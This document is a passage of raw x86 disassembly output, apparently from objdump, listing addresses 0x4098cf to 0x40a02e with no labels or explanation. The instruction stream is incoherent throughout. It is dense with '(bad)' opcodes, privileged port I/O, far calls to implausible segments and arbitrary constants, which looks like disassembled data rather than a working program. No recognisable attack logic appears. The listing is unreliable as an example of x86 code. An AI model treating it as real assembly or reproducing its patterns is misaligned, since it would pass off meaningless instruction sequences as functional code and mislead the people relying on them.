  4098cf:	jno    0x4098b3
  4098d1:	mov    ebp,DWORD PTR [edx]
  4098d3:	dec    edx
  4098d4:	stc    
  4098d5:	(bad)  
  4098d6:	xchg   esi,eax
  4098d7:	out    dx,al
  4098d8:	jmp    0xe09896dd
  4098dd:	inc    edx
  4098de:	mov    esi,DWORD PTR ds:0xbb0b94f1
  4098e4:	pop    esi
  4098e5:	or     DWORD PTR [edi+edx*2+0x6eadb7d],0x3884a13d
  4098f0:	push   ecx
  4098f1:	jns    0x409945
  4098f3:	adc    al,0xc2
  4098f5:	(bad)  
  4098f6:	in     al,dx
  4098f7:	inc    esp
  4098f8:	add    DWORD PTR [edx-0x3c],edx
  4098fb:	(bad)  
  4098fd:	mov    ah,bh
  4098ff:	std    
  409900:	push   eax
  409901:	inc    ecx
  409902:	adc    BYTE PTR [esi],dl
  409904:	std    
  409905:	inc    ecx
  409906:	add    eax,0x169de576
  40990b:	adc    DWORD PTR [edi],ecx
  40990d:	jo     0x4098aa
  40990f:	inc    esp
  409910:	mov    es,ecx
  409912:	pop    edi
  409913:	xchg   al,al
  409915:	jmp    0x409906
  409917:	cwde   
  409918:	mov    al,ds:0x369396cf
  40991d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40991e:	jl     0x4098c2
  409920:	into   
  409921:	add    bl,ch
  409923:	lahf   
  409924:	mov    ebx,0x5e4d1d39
  409929:	push   edi
  40992a:	ins    BYTE PTR es:[edi],dx
  40992b:	outs   dx,DWORD PTR ds:[esi]
  40992c:	push   0x57
  40992e:	push   cs
  40992f:	fld    DWORD PTR [ebp-0x70]
  409932:	fwait
  409933:	rcl    esi,1
  409935:	jae    0x4098db
  409937:	push   0xd279d07
  40993c:	retf   0x5b84
  40993f:	pop    eax
  409940:	add    al,0x6f
  409942:	(bad)  
  409943:	push   0xb2b1af59
  409948:	mov    DWORD PTR [ebx+0x3a],esi
  40994b:	lea    esi,[edx-0x2cfd9dea]
  409951:	cdq    
  409952:	addr16 inc esp
  409954:	pop    eax
  409955:	pop    esi
  409956:	outs   dx,DWORD PTR ds:[esi]
  409957:	sar    BYTE PTR [ecx],0xd
  40995a:	xor    eax,0x3b2d6807
  40995f:	xor    BYTE PTR [ecx],cl
  409961:	ror    BYTE PTR [ebx-0x79c304db],1
  409967:	and    BYTE PTR [ebx+0x3d62ac4a],dh
  40996d:	lock (bad) 
  40996f:	pop    ss
  409970:	es dec ecx
  409972:	mov    bh,0xfd
  409974:	lock dec ecx
  409976:	fwait
  409977:	mov    ebp,DWORD PTR [eax+0x497e5e8a]
  40997d:	test   eax,0xa2dc4aa3
  409982:	inc    eax
  409983:	and    BYTE PTR [eax+0x7fbd8232],0x1a
  40998a:	cmp    edi,DWORD PTR [edi+esi*8-0x706cd347]
  409991:	retf   0xe5e2
  409994:	cli    
  409995:	adc    ecx,0xca14b5a5
  40999b:	ss dec esi
  40999d:	jne    0x4099b9
  40999f:	dec    ebx
  4099a0:	dec    ebp
  4099a1:	mov    ch,dh
  4099a3:	add    ebx,esi
  4099a5:	rcl    dl,0xac
  4099a8:	fcom   st(2)
  4099aa:	dec    edx
  4099ab:	imul   esi,DWORD PTR [esi-0x335b75e],0xffffffd0
  4099b2:	dec    edx
  4099b3:	mov    al,ds:0xc00d65b9
  4099b8:	clc    
  4099b9:	lahf   
  4099ba:	dec    eax
  4099bb:	bound  esi,QWORD PTR [ecx]
  4099bd:	mov    edi,0x87e71439
  4099c2:	xchg   ecx,eax
  4099c3:	mov    WORD PTR [ecx-0x11],ds
  4099c6:	add    dh,ch
  4099c8:	dec    ebx
  4099c9:	iret   
  4099ca:	pop    edi
  4099cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4099cc:	jg     0x4099c2
  4099ce:	adc    eax,esi
  4099d0:	outs   dx,DWORD PTR ds:[esi]
  4099d1:	into   
  4099d2:	push   es
  4099d3:	and    esi,DWORD PTR [eax+0x620078f4]
  4099d9:	scas   eax,DWORD PTR es:[edi]
  4099da:	out    0x68,eax
  4099dc:	inc    ebx
  4099dd:	pop    edi
  4099de:	inc    edi
  4099df:	push   eax
  4099e0:	push   ebx
  4099e1:	pop    ebp
  4099e2:	or     dh,dl
  4099e4:	in     eax,0x2b
  4099e6:	stos   DWORD PTR es:[edi],eax
  4099e7:	jnp    0x409a1e
  4099e9:	push   0x621d6af7
  4099ee:	retf   
  4099ef:	cmc    
  4099f0:	cld    
  4099f1:	pop    eax
  4099f2:	jo     0x4099d3
  4099f4:	retf   
  4099f5:	and    ebx,DWORD PTR [ebx+edx*8]
  4099f8:	bound  esp,QWORD PTR [ebp-0x32]
  4099fb:	push   0x30d82ab1
  409a00:	cdq    
  409a01:	push   edi
  409a02:	popf   
  409a03:	dec    ebp
  409a04:	dec    esp
  409a05:	fist   DWORD PTR [eax-0x7b357970]
  409a0b:	bound  esp,QWORD PTR [eax+0x59]
  409a0e:	pop    edx
  409a0f:	stos   DWORD PTR es:[edi],eax
  409a10:	inc    ebx
  409a11:	add    DWORD PTR [edx+0x2418fb3c],ebx
  409a17:	sbb    DWORD PTR ds:0x4f29b02,edi
  409a1d:	js     0x409a3e
  409a1f:	(bad)  
  409a20:	push   ds
  409a21:	jne    0x409aa1
  409a23:	mov    ch,0x2d
  409a25:	jecxz  0x409a54
  409a27:	pusha  
  409a28:	imul   ecx,DWORD PTR [edi],0x16
  409a2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a2c:	jno    0x409a0f
  409a2e:	test   DWORD PTR [ecx+0x209afb14],ebp
  409a34:	shl    BYTE PTR [ebx-0x59],cl
  409a37:	jae    0x409a1a
  409a39:	sub    dh,BYTE PTR [ebp+0x44]
  409a3c:	dec    eax
  409a3d:	pop    ecx
  409a3e:	ins    BYTE PTR es:[edi],dx
  409a3f:	jne    0x409a0c
  409a41:	adc    BYTE PTR [edx+eax*2],0xd8
  409a45:	pop    ecx
  409a46:	mov    edi,0x8f2248a9
  409a4b:	repnz ror ecx,1
  409a4e:	adc    ebx,ecx
  409a50:	jle    0x409a9b
  409a52:	fstp   TBYTE PTR [ecx]
  409a54:	push   edi
  409a55:	pop    ebx
  409a56:	push   DWORD PTR [esi]
  409a58:	mov    dl,0xbe
  409a5a:	or     dh,BYTE PTR [ebx+edi*1]
  409a5d:	shr    DWORD PTR [eax+0x19],cl
  409a60:	in     eax,dx
  409a61:	ja     0x409a5b
  409a63:	(bad)  
  409a64:	dec    ecx
  409a65:	lods   eax,DWORD PTR ds:[esi]
  409a66:	push   es
  409a67:	imul   BYTE PTR [ecx+eax*4]
  409a6a:	add    bl,BYTE PTR [ebx+ebx*2+0x4b]
  409a6e:	mov    esi,ebx
  409a70:	fwait
  409a71:	sbb    esi,DWORD PTR [eax+0x5e]
  409a74:	sub    esp,esp
  409a76:	cmp    cl,BYTE PTR [esi+0x16]
  409a79:	sbb    eax,0xdfad9d07
  409a7e:	add    eax,0x626b4c57
  409a83:	sub    al,0xdd
  409a85:	pop    edi
  409a86:	popa   
  409a87:	es ja  0x409a9c
  409a8a:	je     0x409aab
  409a8c:	pushf  
  409a8d:	jg     0x409b04
  409a8f:	mov    eax,0x5e5f8eb3
  409a94:	mov    ecx,eax
  409a96:	ret    
  409a97:	pop    ecx
  409a98:	jno    0x409a21
  409a9a:	jae    0x409ad1
  409a9c:	xor    BYTE PTR [ebx],0x5b
  409a9f:	push   ebx
  409aa0:	xor    eax,DWORD PTR [esi-0x16f8884a]
  409aa6:	cdq    
  409aa7:	lock nop
  409aa9:	retf   0xc4ed
  409aac:	jge    0x409a44
  409aae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409aaf:	das    
  409ab0:	add    edi,esi
  409ab2:	jge    0x409a85
  409ab4:	ss xor ebx,esp
  409ab7:	loope  0x409b38
  409ab9:	and    DWORD PTR [edi-0x635df0f],ebx
  409abf:	ds scas al,BYTE PTR es:[edi]
  409ac1:	push   ecx
  409ac2:	mov    dl,BYTE PTR [edx]
  409ac4:	ror    al,0x23
  409ac7:	cmp    al,0x73
  409ac9:	jno    0x409b25
  409acb:	push   ebp
  409acc:	jge    0x409af2
  409ace:	pop    es
  409acf:	lds    edi,FWORD PTR [edi-0x3161b523]
  409ad5:	sub    al,0xad
  409ad7:	xor    DWORD PTR [esi+0x1],eax
  409ada:	imul   ebp,ebp,0x95f19d99
  409ae0:	or     eax,DWORD PTR [ecx]
  409ae2:	out    0x72,al
  409ae4:	mov    edi,ecx
  409ae6:	sub    al,0x22
  409ae8:	das    
  409ae9:	jne    0x409a71
  409aeb:	xchg   bh,dl
  409aed:	push   es
  409aee:	or     bh,BYTE PTR [ecx+0x56]
  409af1:	pop    eax
  409af2:	or     eax,0xe2c80838
  409af7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409af8:	mov    al,0x85
  409afa:	add    eax,0xb292e7d1
  409aff:	out    dx,eax
  409b00:	xchg   edi,ecx
  409b02:	lahf   
  409b03:	sar    ebx,cl
  409b05:	xchg   esi,eax
  409b06:	dec    edx
  409b07:	dec    ebx
  409b08:	jns    0x409af2
  409b0a:	cmp    ah,BYTE PTR [eax-0x60]
  409b0d:	inc    ebx
  409b0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b0f:	cmp    BYTE PTR [esi+0x4e7888ad],ah
  409b15:	rcr    DWORD PTR [eax+eax*2+0x7ad511ca],cl
  409b1c:	out    dx,eax
  409b1d:	dec    esp
  409b1e:	loopne 0x409ac4
  409b20:	lahf   
  409b21:	inc    eax
  409b22:	outs   dx,DWORD PTR ds:[esi]
  409b23:	stos   DWORD PTR es:[edi],eax
  409b24:	ds push cs
  409b26:	mov    ah,0x46
  409b28:	push   ebp
  409b29:	test   DWORD PTR [edx],ebp
  409b2b:	xchg   BYTE PTR ds:0x88e41b1f,ah
  409b31:	sub    DWORD PTR [ecx-0x71a122f1],esp
  409b37:	xchg   esi,eax
  409b38:	nop
  409b39:	push   ds
  409b3a:	pop    ebp
  409b3b:	test   eax,0x2fec21c9
  409b40:	cmp    eax,eax
  409b42:	jmp    0x741611f6
  409b47:	lods   al,BYTE PTR ds:[esi]
  409b48:	(bad)  
  409b49:	push   0xffffffa3
  409b4b:	add    eax,0xf18a9019
  409b50:	jmp    0x35e2ae4a
  409b55:	mov    bh,0xd1
  409b57:	nop
  409b58:	lahf   
  409b59:	addr16 test ebx,ebp
  409b5c:	loope  0x409b6b
  409b5e:	sub    dh,BYTE PTR [edx-0x62]
  409b61:	pop    ebp
  409b62:	ret    
  409b63:	xchg   esp,edx
  409b65:	mov    ebx,0xdea24b15
  409b6a:	sbb    edi,DWORD PTR [eax]
  409b6c:	push   esi
  409b6d:	push   ebp
  409b6e:	or     esi,DWORD PTR [edi+0x3f]
  409b71:	leave  
  409b72:	stos   BYTE PTR es:[edi],al
  409b73:	in     eax,0xef
  409b75:	adc    edi,DWORD PTR [ecx+0x56]
  409b78:	push   ss
  409b79:	imul   ebx,DWORD PTR [edx],0x3d27bc74
  409b7f:	pop    ds
  409b80:	mov    edx,0xa9bdd637
  409b85:	add    DWORD PTR [eax],esi
  409b87:	loop   0x409b54
  409b89:	hlt    
  409b8a:	xchg   esi,eax
  409b8b:	xchg   esi,eax
  409b8c:	out    0xad,eax
  409b8e:	ret    
  409b8f:	mov    ds:0x5f232bdf,al
  409b94:	clc    
  409b95:	pop    edx
  409b96:	fst    DWORD PTR [esi]
  409b98:	in     eax,dx
  409b99:	out    dx,eax
  409b9a:	xchg   DWORD PTR [edi],ebx
  409b9c:	push   esi
  409b9d:	loop   0x409b5e
  409b9f:	push   ebp
  409ba0:	or     al,0x66
  409ba2:	inc    ebx
  409ba3:	ja     0x409bed
  409ba5:	cmp    eax,0x2cd77453
  409baa:	xlat   BYTE PTR ds:[ebx]
  409bab:	mov    bl,0x4f
  409bad:	xchg   ecx,eax
  409bae:	data16 and BYTE PTR [ecx],bl
  409bb1:	cmp    BYTE PTR [edi+0x72],dh
  409bb4:	sahf   
  409bb5:	sti    
  409bb6:	mov    ch,0xd0
  409bb8:	dec    edi
  409bb9:	or     al,dl
  409bbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409bbc:	xchg   ebp,eax
  409bbd:	mov    eax,0xc13a7de
  409bc2:	push   0x37
  409bc4:	cli    
  409bc5:	stos   BYTE PTR es:[edi],al
  409bc6:	and    eax,0xc23f8840
  409bcb:	bound  eax,QWORD PTR [esi+0x485443b6]
  409bd1:	jbe    0x409bfa
  409bd3:	jmp    0x409bdd
  409bd5:	mov    ds:0xc7447baa,eax
  409bda:	xchg   ebx,eax
  409bdb:	daa    
  409bdc:	jbe    0x409b8f
  409bde:	(bad)  
  409bdf:	mov    ds:0xa7760a7a,al
  409be4:	lods   al,BYTE PTR ds:[esi]
  409be5:	add    al,ah
  409be7:	lahf   
  409be8:	sbb    eax,0xa952bded
  409bed:	xchg   ecx,eax
  409bee:	popf   
  409bef:	imul   esi,DWORD PTR [ebp+0x40],0x48
  409bf3:	sbb    dh,ah
  409bf5:	push   edi
  409bf6:	sbb    al,0xc9
  409bf8:	dec    ecx
  409bf9:	or     DWORD PTR [ecx],edx
  409bfb:	ja     0x409c4a
  409bfd:	fldcw  WORD PTR [ebp-0xa]
  409c00:	sub    BYTE PTR [esi-0x13e431ff],ch
  409c06:	(bad)  
  409c07:	frstor [esi+0x76]
  409c0a:	inc    ebx
  409c0b:	daa    
  409c0c:	mov    ah,0xfd
  409c0e:	pop    ecx
  409c0f:	scas   eax,DWORD PTR es:[edi]
  409c10:	loopne 0x409c1e
  409c12:	push   edi
  409c13:	sbb    BYTE PTR [esi-0x123595be],cl
  409c19:	stc    
  409c1a:	fwait
  409c1b:	pminub mm4,QWORD PTR [ebx]
  409c1e:	sar    esi,cl
  409c20:	cs dec esp
  409c22:	mov    DWORD PTR [ecx],ebx
  409c24:	cmp    al,0x18
  409c26:	adc    esp,DWORD PTR [ebx-0x6b68fd3f]
  409c2c:	or     esp,DWORD PTR [ecx+0x39720b82]
  409c32:	pop    ebp
  409c33:	add    eax,0x1026a3d5
  409c38:	cmovb  esp,esp
  409c3b:	push   esi
  409c3c:	xor    esi,edi
  409c3e:	stos   BYTE PTR es:[edi],al
  409c3f:	gs push ebx
  409c41:	adc    eax,0xb4461a79
  409c46:	sbb    BYTE PTR [edi+0x2d],bl
  409c49:	sub    esi,ebx
  409c4b:	div    BYTE PTR [eax+ebp*4+0x5e919007]
  409c52:	stos   BYTE PTR es:[edi],al
  409c53:	aas    
  409c54:	jmp    0x8c96:0xbc0e3ef5
  409c5b:	cmp    BYTE PTR [esi],bh
  409c5d:	mov    ds:0xb8f2e7d8,eax
  409c62:	pop    eax
  409c63:	inc    ecx
  409c64:	imul   esi,DWORD PTR ss:[ecx],0xffffff8d
  409c68:	clc    
  409c69:	jge    0x409bee
  409c6b:	sbb    al,0x14
  409c6d:	inc    ebp
  409c6e:	cmc    
  409c6f:	and    dl,BYTE PTR fs:[esi-0x4fc40ce4]
  409c76:	shl    ebp,cl
  409c78:	adc    al,0x90
  409c7a:	xchg   BYTE PTR [ebx],ch
  409c7c:	scas   eax,DWORD PTR es:[edi]
  409c7d:	int3   
  409c7e:	xchg   BYTE PTR [edx-0x6dffde3c],dh
  409c84:	xlat   BYTE PTR ds:[ebx]
  409c85:	dec    esi
  409c86:	(bad)  
  409c87:	jp     0x409cdf
  409c89:	inc    eax
  409c8a:	sub    DWORD PTR [ebx-0x1dd294ba],esi
  409c90:	sti    
  409c91:	ret    
  409c92:	mov    dh,0xb1
  409c94:	rcl    BYTE PTR [eax],0xd2
  409c97:	mov    DWORD PTR ds:0x3fe9b1ea,ecx
  409c9d:	(bad)  
  409c9e:	xor    al,0xed
  409ca0:	pop    esp
  409ca1:	fld    TBYTE PTR [esi+edi*1-0x13e0e115]
  409ca8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ca9:	ficom  WORD PTR [esi-0x19e2e4ae]
  409caf:	adc    BYTE PTR [esi+ecx*8+0x5],dh
  409cb3:	scas   al,BYTE PTR es:[edi]
  409cb4:	fbstp  TBYTE PTR [esi+ecx*4]
  409cb7:	or     BYTE PTR fs:0x77e8023e,bl
  409cbe:	or     bh,BYTE PTR [esi+0x13]
  409cc1:	mov    WORD PTR [edx*8+0x19197bd5],cs
  409cc8:	and    al,0x77
  409cca:	pop    esi
  409ccb:	and    ebx,DWORD PTR [eax-0x78ccd47]
  409cd1:	out    dx,eax
  409cd2:	sbb    al,BYTE PTR [edi]
  409cd4:	pop    ss
  409cd5:	outs   dx,BYTE PTR ds:[esi]
  409cd6:	push   eax
  409cd7:	or     edx,DWORD PTR [ecx]
  409cd9:	xor    DWORD PTR fs:[edi+0x55e8f856],edi
  409ce0:	pop    ss
  409ce1:	jge    0x409cb1
  409ce3:	push   es
  409ce4:	jg     0x409ce4
  409ce6:	stos   BYTE PTR es:[edi],al
  409ce7:	cwde   
  409ce8:	push   eax
  409ce9:	xchg   edx,eax
  409cea:	call   0xa9879e24
  409cef:	dec    esp
  409cf0:	sbb    edi,DWORD PTR [ebp-0x1]
  409cf3:	push   ecx
  409cf4:	jmp    0x409d53
  409cf6:	xchg   ebx,eax
  409cf7:	out    0x3c,al
  409cf9:	push   ss
  409cfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409cfb:	dec    edi
  409cfc:	ds in  eax,0x78
  409cff:	iret   
  409d00:	jo     0x409d69
  409d02:	or     BYTE PTR [ebx+0x3a2a5806],ah
  409d08:	pop    esp
  409d09:	in     al,0xc4
  409d0b:	or     eax,0xc3f3eaf9
  409d10:	mov    bl,0xc1
  409d12:	jae    0x409d62
  409d14:	pop    ss
  409d15:	shr    DWORD PTR [eax],1
  409d17:	jnp    0x409d7b
  409d19:	add    eax,0x2d0dd496
  409d1e:	fxch   st(2)
  409d20:	push   eax
  409d21:	cld    
  409d22:	scas   al,BYTE PTR es:[edi]
  409d23:	push   0x42aa8a5f
  409d28:	mov    WORD PTR [ecx+edi*4-0x20b48ae0],cs
  409d2f:	fsub   QWORD PTR [edx-0x59]
  409d32:	sub    edx,eax
  409d34:	imul   ebp,DWORD PTR [ebx+0x75],0xddca797a
  409d3b:	js     0x409cd3
  409d3d:	pop    es
  409d3e:	dec    ebx
  409d3f:	imul   eax,esi,0xfffffff4
  409d42:	gs jmp 0x409d22
  409d45:	scas   al,BYTE PTR es:[edi]
  409d46:	in     al,0xa3
  409d48:	rcl    BYTE PTR [eax+eax*1],cl
  409d4b:	test   al,0x76
  409d4d:	mov    ebx,0x97459e2d
  409d52:	retf   
  409d53:	stos   BYTE PTR es:[edi],al
  409d54:	aad    0xa7
  409d56:	add    DWORD PTR ds:0xf7bf3a0b,0xffffffd6
  409d5d:	loop   0x409d1b
  409d5f:	push   esp
  409d60:	pop    eax
  409d61:	and    bl,BYTE PTR [ebx+0x337b6598]
  409d67:	dec    esi
  409d68:	test   al,0xb6
  409d6a:	and    dl,BYTE PTR [ebp+0x74]
  409d6d:	retf   0x56fe
  409d70:	dec    esi
  409d71:	inc    edi
  409d72:	imul   edi,DWORD PTR [edi],0xb997ad58
  409d78:	jno    0x409d40
  409d7a:	and    al,cl
  409d7c:	mov    ds:0x4a6a188a,eax
  409d81:	fadd   st,st(7)
  409d83:	pusha  
  409d84:	sbb    al,0xab
  409d86:	jo     0x409d87
  409d88:	push   cs
  409d89:	in     eax,dx
  409d8a:	sbb    eax,0xdc0a8f8a
  409d8f:	lds    esi,FWORD PTR [esp+ebp*1-0xa]
  409d93:	mov    dl,0x29
  409d95:	and    al,0x42
  409d97:	xor    ch,dh
  409d99:	push   ds
  409d9a:	data16 fst st(2)
  409d9d:	jp     0x409d60
  409d9f:	out    0x51,eax
  409da1:	inc    esi
  409da2:	stc    
  409da3:	pusha  
  409da4:	and    cl,0xd2
  409da7:	iret   
  409da8:	in     al,0xbf
  409daa:	adc    cl,BYTE PTR [ebx+0xad5612f]
  409db0:	push   0xffffffae
  409db2:	cmp    cl,al
  409db4:	push   ebp
  409db5:	stos   DWORD PTR es:[edi],eax
  409db6:	push   edi
  409db7:	xor    bl,bl
  409db9:	sahf   
  409dba:	sub    DWORD PTR [edi],ebx
  409dbc:	add    edx,DWORD PTR [ecx-0x43]
  409dbf:	cmp    eax,0x6f99c8
  409dc4:	push   0x16767c81
  409dc9:	xor    al,0x85
  409dcb:	pop    edi
  409dcc:	add    ebx,DWORD PTR [eax+0xf4c9805]
  409dd2:	in     eax,0x3e
  409dd4:	(bad)  
  409dd5:	xor    ecx,DWORD PTR [ebx+0x53801fd3]
  409ddb:	sub    eax,0xc5963ed0
  409de0:	into   
  409de1:	inc    BYTE PTR ds:0x7b324882
  409de7:	xchg   DWORD PTR [eax+0x29cc1324],esi
  409ded:	xchg   ecx,eax
  409dee:	mov    al,0xfd
  409df0:	icebp  
  409df1:	sar    DWORD PTR [esi+edx*1],1
  409df4:	fist   WORD PTR [eax]
  409df6:	loop   0x409e3f
  409df8:	loopne 0x409e0b
  409dfa:	sub    ch,BYTE PTR [eax+0x7689370b]
  409e00:	add    esi,edx
  409e02:	dec    esp
  409e03:	loope  0x409deb
  409e05:	sti    
  409e06:	shl    ebp,cl
  409e08:	push   0xffffffcd
  409e0a:	mov    edx,0x70b41fff
  409e0f:	pushf  
  409e10:	stos   BYTE PTR es:[edi],al
  409e11:	rcr    DWORD PTR [ebx-0x686874a8],1
  409e17:	jge    0x409e3b
  409e19:	or     BYTE PTR [ebp-0xcfa0841],ah
  409e1f:	pop    ebx
  409e20:	shl    DWORD PTR [ebp+0x36],1
  409e23:	xor    dl,BYTE PTR [edi]
  409e25:	xor    DWORD PTR [ebp+edi*2-0x72],0x71
  409e2a:	xor    ecx,DWORD PTR [esi+0x111b2ba3]
  409e30:	sub    edi,0xffffffec
  409e33:	pop    es
  409e34:	iret   
  409e35:	xor    al,0x6
  409e37:	add    dh,0x1e
  409e3a:	stc    
  409e3b:	mov    esi,0x6ae853b6
  409e40:	jl     0x409e99
  409e42:	out    dx,al
  409e43:	shr    BYTE PTR [edx+edx*4],0xef
  409e47:	outs   dx,BYTE PTR ds:[esi]
  409e48:	add    al,0x0
  409e4a:	cmc    
  409e4b:	xor    BYTE PTR [edi],al
  409e4d:	pop    ecx
  409e4e:	inc    eax
  409e4f:	shr    BYTE PTR [edi+0x6d],1
  409e52:	or     DWORD PTR [edi],edi
  409e54:	jne    0x409e9b
  409e56:	stos   DWORD PTR es:[edi],eax
  409e57:	xor    ecx,esi
  409e59:	inc    ebp
  409e5a:	xlat   BYTE PTR ds:[ebx]
  409e5b:	mov    ch,cl
  409e5d:	cmp    BYTE PTR [ebp*2-0x60cc3214],ah
  409e64:	pusha  
  409e65:	call   0xa06c:0xf91d0273
  409e6c:	out    0x5a,al
  409e6e:	pop    eax
  409e6f:	inc    ebx
  409e70:	(bad)
  409e74:	and    eax,0x4cdc4628
  409e79:	mov    bh,0x23
  409e7b:	mov    ebx,fs
  409e7d:	mov    ah,0xbd
  409e7f:	or     al,ah
  409e81:	add    bh,BYTE PTR [eax-0x3a]
  409e84:	pop    eax
  409e85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e86:	ja     0x409ece
  409e88:	pop    esi
  409e89:	mov    bl,0x1
  409e8b:	or     dh,dl
  409e8d:	mov    eax,ds:0x378118c0
  409e92:	pop    ds
  409e93:	ins    BYTE PTR es:[edi],dx
  409e94:	sahf   
  409e95:	jne    0x409e57
  409e97:	loop   0x409f0a
  409e99:	push   esp
  409e9a:	nop
  409e9b:	(bad)  
  409e9c:	(bad)  
  409e9e:	pop    eax
  409e9f:	sbb    al,0xd9
  409ea1:	setns  BYTE PTR [edi-0x1917cace]
  409ea8:	sub    ch,BYTE PTR [ebp+0x102f3327]
  409eae:	out    0xef,eax
  409eb0:	test   eax,0xd1e50af2
  409eb5:	mov    esp,0x2e136aba
  409eba:	adc    DWORD PTR [edx],ecx
  409ebc:	(bad)  
  409ebd:	in     eax,dx
  409ebe:	pop    esi
  409ebf:	retf   
  409ec0:	push   0x5ae7d62a
  409ec5:	aaa    
  409ec6:	aaa    
  409ec7:	pop    ebx
  409ec8:	test   esp,ecx
  409eca:	sub    BYTE PTR [edx+esi*8-0x66],al
  409ece:	dec    edi
  409ecf:	sub    ecx,DWORD PTR [eax+edx*8]
  409ed2:	cmp    edi,DWORD PTR [eax+0x45]
  409ed5:	je     0x409e7e
  409ed7:	aaa    
  409ed8:	xor    al,0xd1
  409eda:	pop    esp
  409edb:	stos   BYTE PTR es:[edi],al
  409edc:	add    eax,0x4e666cd5
  409ee1:	add    eax,0xc0717a9f
  409ee6:	sar    BYTE PTR [ecx+0x29],cl
  409ee9:	scas   al,BYTE PTR es:[edi]
  409eea:	mov    al,0x59
  409eec:	or     BYTE PTR [ebp-0x5c288e36],bl
  409ef2:	out    0x91,al
  409ef4:	inc    ebx
  409ef5:	aas    
  409ef6:	cmp    BYTE PTR [eax+0x3c],ch
  409ef9:	je     0x409f25
  409efb:	mov    BYTE PTR [eax+edx*8],0xa8
  409eff:	mov    dl,0xce
  409f01:	test   BYTE PTR [ebx+0x53],ch
  409f04:	sbb    bl,BYTE PTR [ebp-0xed62944]
  409f0a:	xor    DWORD PTR [edx-0x1b9d2a82],eax
  409f10:	out    0x6a,eax
  409f12:	ins    BYTE PTR es:[edi],dx
  409f13:	repnz sub eax,0x9f478146
  409f19:	daa    
  409f1a:	xor    al,0x6c
  409f1c:	mul    dl
  409f1e:	call   0x892b1a5d
  409f23:	mov    ds:0xed6e35ff,al
  409f28:	jmp    0x409ec0
  409f2a:	xor    edx,DWORD PTR [eax+0x17]
  409f2d:	mov    dh,0xec
  409f2f:	xor    DWORD PTR [eax-0x18a047c9],esp
  409f35:	mov    ebx,0xb2073d99
  409f3a:	icebp  
  409f3b:	cmp    eax,0x8c0f42ee
  409f40:	and    DWORD PTR [ecx+0x21dc10cf],ebp
  409f46:	mov    eax,0x6ed8ab6
  409f4b:	shr    BYTE PTR [edx],cl
  409f4d:	shl    edx,0xcf
  409f50:	and    eax,0xe68baa8c
  409f55:	call   0x9a05:0x24bc320f
  409f5c:	je     0x409f04
  409f5e:	rcr    DWORD PTR [edx+0x40],1
  409f61:	pop    edi
  409f62:	xchg   ebp,eax
  409f63:	aad    0x6
  409f65:	mov    WORD PTR [ecx+0x58],?
  409f68:	jnp    0x409f7e
  409f6a:	mov    edx,0x48264710
  409f6f:	mov    dh,0xd2
  409f71:	test   eax,0xec456d1e
  409f76:	out    dx,al
  409f77:	sahf   
  409f78:	inc    ecx
  409f79:	pop    es
  409f7a:	cli    
  409f7b:	sub    al,0x3e
  409f7d:	pop    esp
  409f7e:	xchg   edx,eax
  409f7f:	pop    esi
  409f80:	xchg   ebx,eax
  409f81:	mov    ecx,0x3d6fbd7e
  409f86:	shl    DWORD PTR [ebx-0x7e],0x93
  409f8a:	test   al,0xf9
  409f8c:	push   0xffffff9e
  409f8e:	xlat   BYTE PTR ds:[ebx]
  409f8f:	mov    edi,0x5665106
  409f94:	sub    eax,0xb2a49231
  409f99:	adc    al,BYTE PTR [ecx-0x56]
  409f9c:	sbb    DWORD PTR ds:0xdef0712b,esp
  409fa2:	aaa    
  409fa3:	add    BYTE PTR [ebx-0x3e61741f],0x14
  409faa:	xchg   edi,eax
  409fab:	mov    cl,0xd6
  409fad:	pop    edx
  409fae:	jns    0x409fb3
  409fb0:	push   cs
  409fb1:	je     0x409fca
  409fb3:	mov    ch,0xca
  409fb5:	stos   BYTE PTR es:[edi],al
  409fb6:	retf   0xca4a
  409fb9:	xchg   esi,eax
  409fba:	push   0xffffff95
  409fbc:	xor    ch,BYTE PTR [ebx-0x4bd5e6ab]
  409fc2:	popa   
  409fc3:	ror    BYTE PTR [edx],0xa0
  409fc6:	push   edx
  409fc7:	jmp    0x409f8d
  409fc9:	jle    0x40a01e
  409fcb:	shl    esp,cl
  409fcd:	mov    ch,0x18
  409fcf:	in     eax,dx
  409fd0:	aaa    
  409fd1:	mov    WORD PTR [eax-0x5],gs
  409fd4:	pop    esi
  409fd5:	adc    ecx,esp
  409fd7:	outs   dx,DWORD PTR ds:[esi]
  409fd8:	xlat   BYTE PTR ds:[ebx]
  409fd9:	fst    QWORD PTR [ebx-0x70]
  409fdc:	dec    ebx
  409fdd:	pop    ebp
  409fde:	test   DWORD PTR [edi],eax
  409fe0:	mov    dl,0xca
  409fe2:	jo     0x409fe0
  409fe4:	push   eax
  409fe5:	dec    eax
  409fe6:	pop    esi
  409fe7:	test   al,0x76
  409fe9:	test   al,0xe2
  409feb:	ja     0x409f90
  409fed:	ret    0x5c28
  409ff0:	loopne 0x409f87
  409ff2:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  409ff4:	jno    0x40a00b
  409ff6:	add    bl,BYTE PTR [esi-0x1c]
  409ff9:	pop    ebp
  409ffa:	out    0xf8,eax
  409ffc:	loopne 0x40a032
  409ffe:	popf   
  409fff:	das    
  40a000:	fldenv [esi]
  40a002:	push   ds
  40a003:	xchg   ebx,eax
  40a004:	xchg   esp,eax
  40a005:	call   0xed2d:0xcb62c2d2
  40a00c:	add    ah,BYTE PTR [edi-0x36]
  40a00f:	jge    0x409fe6
  40a011:	test   DWORD PTR [eax+0x15],esp
  40a014:	fs scas eax,DWORD PTR es:[edi]
  40a016:	mov    esi,0xa03e9c4e
  40a01b:	sbb    BYTE PTR [ecx+0x60c05ff],al
  40a021:	cmc    
  40a022:	aaa    
  40a023:	sub    esi,eax
  40a025:	dec    ebp
  40a026:	(bad)  
  40a027:	fld    DWORD PTR [ecx-0x5d]
  40a02a:	cdq    
  40a02b:	ficomp DWORD PTR [esi+0x44]
  40a02e:	mov    bl,bl
